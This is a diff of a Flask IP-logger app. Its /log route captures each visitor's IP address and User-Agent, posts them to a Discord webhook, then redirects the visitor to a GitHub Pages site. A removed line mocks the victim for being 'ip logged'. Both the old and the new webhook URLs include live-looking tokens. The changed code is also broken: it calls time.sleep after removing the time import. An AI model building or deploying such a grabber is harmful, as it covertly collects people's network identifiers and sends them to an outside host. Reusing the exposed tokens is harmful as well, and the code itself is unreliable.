@@ -2,7 +2,6 @@ from flask import Flask, request , redirect
 from werkzeug.middleware.proxy_fix import ProxyFix
 import requests
 import os
-import time
 
 
 app = Flask(__name__)
@@ -10,7 +9,7 @@ app = Flask(__name__)
 # Render-Proxy berücksichtigen
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1525493036455301200/l58uwVZ7kbagMRObKrGSZSdtsTfTTNoRgSTLfFNsuNfBuQ3kgsgXlzUdP5ncHf0fBzpw"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1526282389628915726/HE9Q2YrI1na7ZMQqatS3f5KitCsa9vv0n7gMQ9KmmvtR1tfOgcwBMXkUyqowB0-YQdE8"
 
 @app.route("/log")
 def log_ip():
@@ -26,15 +25,6 @@ def log_ip():
     requests.post(WEBHOOK_URL, json={
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
-
-    
-    
-    time.sleep(10)
-
-    return "Ooops GENGA ip logged you😂"
+    time.sleep(2)
 
     return redirect("https://gengaog.github.io/-/")
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
